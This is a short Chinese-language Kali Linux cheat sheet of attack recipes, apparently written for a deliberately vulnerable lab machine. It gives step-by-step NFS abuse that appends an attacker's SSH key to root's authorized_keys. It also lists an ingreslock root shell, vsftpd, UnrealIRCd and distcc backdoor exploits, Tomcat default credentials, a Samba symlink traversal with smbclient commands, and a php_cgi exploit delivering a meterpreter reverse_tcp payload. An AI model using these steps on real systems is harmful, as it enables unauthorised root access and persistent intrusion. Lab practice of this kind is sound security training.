# Kali Linux #
## Ingreslock后门漏洞 ##
**Port**: 1524  
telnet直接获取Root权限
## Linux NFS共享目录配置漏洞 ##
Step1：查看目标主机上NFS服务是否开启：   
```
rpcinfo -p 192.168.1.3   
```   
Step2:显示指定的远程共享目录列表：   
```
showmount -e 192.168.1.3
```   
Step3:生成rsa公钥：   
```
ssh-keygen
```   
Step4:
```
mkdir /tmp/tool 建立tool目录   
mount -t nfs 192.168.1.3:/tmp/tool,把192.168.1.3根目录挂载到/tmp/tool目录下   
```    
Step5：把生成的公钥追加到靶机的authorized_keys下，实现ssh免密码登录：
```
cat  /root/.ssh/id_rsa.pub>>/tmp/tool/root/.ssh/authorized_keys
```
Step6:连接
```
ssh root@ip
```
## Metasploit溢出vsftp特权提升漏洞 ##
**Port:** 21
## Metasploit溢出UnrealIRCd后门漏洞 ##
**Port:** 6667
## Tomcat管理台默认口令漏洞 ##
**Port:** 8180    
**Service:** ApacheTomcat/CoyoteJSP engine1.1   
**Default:**tomcat tomcat
## sysmlink 默认配置目录遍历漏洞 ##
**Port:** 445 139   
**Service:** Samba   
**Payload:** auxiliary/admin/smb/samba_symlink_traversal
```
set SMBSHARE tmp SAM可写文件
smbclient //ip/tmp 
cd rootfs 进入root目录
cat /*
```
## Metasploit利用php_cgi漏洞 ##
**Dir:** cgi-bin   
**Exploit:** exploit/multi/php_cgi_arg_injection   
**Payload:**   
```
set PAYLOAD /php/meterpreter/reverse_tcp
```
## Distcc后门漏洞 ##
**Port:** 3632   
**Exploit:** use exploit/unix/misc/distcc_exec   
